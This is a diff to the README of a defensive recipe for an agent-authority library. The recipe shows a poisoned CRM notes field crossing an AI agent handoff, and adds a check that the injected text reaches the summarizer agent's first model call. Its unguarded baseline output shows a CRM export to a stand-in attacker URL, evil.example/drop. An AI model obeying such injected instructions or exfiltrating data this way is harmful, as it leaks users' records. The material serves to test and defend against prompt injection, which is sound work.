@@ -35,6 +35,13 @@ attenu-guard supports 3.9+).
   `RunHooks.on_handoff` — the SDK's own callback, fired after the destination
   agent is resolved and *before* its first model call — so the summarizer's
   real, narrower Guard exists before it can act at all.
+- **The poison genuinely crosses the handoff — checked, not asserted.** The
+  orchestrator's own CRM read comes back with a poisoned notes field; the
+  recipe then checks, on `agents.testing.ScriptedModel.calls` (the SDK's own
+  record of what a model call actually received), that the summarizer's
+  *first* model call carries it. The SDK's default handoff behavior forwards
+  the entire prior conversation, so this is not a controlled special case —
+  it is what always happens absent an `input_filter`.
 - **Fail closed before the tool body runs.** `guarded_tool(...)` authorizes
   every call against the *running* agent's Guard. Both agents hold the
   **identical tool objects** — a shorter tool list is not, and cannot be, the
@@ -95,9 +102,10 @@ rather than checked against an unknown quantity.
   attenu-guard's own `crypto` extra if not already present
   (`pip install 'attenu-guard[crypto]'`)
 - A real application consuming attenu-guard from PyPI would pin
-  `attenu-guard>=0.10,<0.11`; this recipe lives inside the attenu-guard repo
-  itself and imports `src/` directly (or the installed package, either
-  works), so there is nothing to pin here
+  `attenu-guard>=0.10,<0.11`; `demo.py` has no `sys.path` insertion of its
+  own, so it requires the *installed* package — the Setup section's
+  `pip install -e '.[crypto]'` — not an unpublished import of this repo's
+  `src/` tree
 
 ## Setup
 
@@ -149,6 +157,10 @@ and the raw audit-log lines between sections 4 and 5.
 
   child Guard minted at the handoff (RunHooks.on_handoff): chain:n2
   child.is_narrower_than(orchestrator): True
+
+  the poisoned CRM note from c1's own output reached the summarizer's first model call: True
+  (checked on agents.testing.ScriptedModel.calls -- the SDK's own recorded model
+   input for that call -- not asserted by this script)
 
   tool calls, in order:
     ALLOWED  orchestrator  crm_query(rows=60000)   in-authority read
@@ -203,10 +215,11 @@ OK
     RAN     crm_export(destination=https://evil.example/drop)
 
   CRM exported to an external URL without a guard installed? True
-  The SDK still forwards the handoff and the poisoned instruction; nothing about
-  the SDK's own handoff mechanics carries any authority across it -- both agents
-  were handed the identical, unguarded tool objects, so the summarizer's export
-  ability was never a matter of what tools it happened to be given.
+  Both agents were handed the identical, unguarded tool objects -- nothing about
+  the SDK's own handoff mechanics carried any authority across it, so the
+  summarizer's ability to export was never a matter of what tools it happened to
+  be given. (Section 3, not this baseline, is what shows the poisoned note itself
+  crossing the handoff -- this section's own scripted turns carry no such note.)
 
 RESULT: OK
 ```
@@ -270,19 +283,22 @@ tool's own `on_invoke_tool`, and holds:
   tool body did with the arguments once invoked, and nothing about a call
   path that reaches the same side effect without going through this wrapped
   `on_invoke_tool` at all.
-- **The handoff itself carries no filtering here.** By default, both
-  `Handoff.input_filter` (`agents/handoffs/__init__.py:158`) and
-  `RunConfig.handoff_input_filter` (`agents/run_config.py:338`) are `None`,
-  and `RunConfig.nest_handoff_history` (`agents/run_config.py:346`) is
-  `False` — when none of these is set, as in this recipe,
-  `agents/run_internal/turn_resolution.py`'s handoff-resolution code
-  (`input_filter is not None or should_nest_history`, line 653) never touches
-  the accumulated input at all, so the *entire* prior conversation, poisoned
-  instruction included, reaches the summarizer verbatim. This is exactly why
-  the summarizer needs its own attenuated authority: the SDK does not, and is
-  not trying to, keep poisoned content out of the child's context — that is
-  what makes "the child can act on what it sees" and "the child may act only
-  on what it was delegated" two different, and both necessary, properties.
+- **The handoff itself carries no filtering here — observed, not just
+  argued.** By default, both `Handoff.input_filter`
+  (`agents/handoffs/__init__.py:158`) and `RunConfig.handoff_input_filter`
+  (`agents/run_config.py:338`) are `None`, and `RunConfig.nest_handoff_history`
+  (`agents/run_config.py:346`) is `False` — when none of these is set, as in
+  this recipe, `agents/run_internal/turn_resolution.py`'s handoff-resolution
+  code (`input_filter is not None or should_nest_history`, line 653) never
+  touches the accumulated input at all, so the *entire* prior conversation
+  reaches the summarizer verbatim. Section 3 checks this directly rather than
+  only citing it: the orchestrator's own CRM read returns a poisoned notes
+  field, and the recipe asserts that text appears in the summarizer's first
+  recorded model call (`ScriptedModel.calls`). This is exactly why the
+  summarizer needs its own attenuated authority: the SDK does not, and is not
+  trying to, keep poisoned content out of the child's context — that is what
+  makes "the child can act on what it sees" and "the child may act only on
+  what it was delegated" two different, and both necessary, properties.
 
 It does not defend against an attacker with code execution in the same
 process, who can edit the declared grants in this recipe's own `demo.py`
